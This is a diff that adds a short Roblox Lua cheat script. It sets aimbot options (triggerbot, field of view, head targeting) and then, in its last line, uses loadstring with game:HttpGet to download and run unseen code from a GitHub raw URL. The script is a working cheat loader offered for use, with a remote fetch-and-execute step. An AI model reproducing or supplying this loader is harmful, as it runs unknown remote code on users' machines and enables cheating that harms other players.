@@ -1,0 +1,9 @@
+--Settings:    
+getgenv().Options = {
+        Enabled = true,
+        Triggerbot = true,
+        FOV = 150,
+        Smoothnes = true,
+        AimPart = "Head",
+    }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ODI24/dddddddddddd/main/d", true))()
